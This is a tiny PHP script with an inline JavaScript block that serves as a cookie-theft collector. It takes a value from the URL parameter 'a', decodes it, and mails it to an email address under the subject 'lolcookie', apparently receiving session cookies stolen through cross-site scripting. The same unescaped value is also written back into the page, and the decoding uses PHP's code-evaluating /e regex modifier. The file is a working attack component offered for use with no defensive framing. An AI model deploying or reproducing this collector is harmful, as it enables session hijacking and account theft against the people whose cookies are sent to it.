<?
	$steal = $_GET['a'];
	$steal2 = preg_replace('/%([0-9a-f]{2})/ie', "chr(hexdec('\\1'))", $steal);
	mail("jpnance@gmail.com", "lolcookie", $steal2);
?>
<script>
	document.write(decodeURIComponent('<?=$steal?>'));
</script>
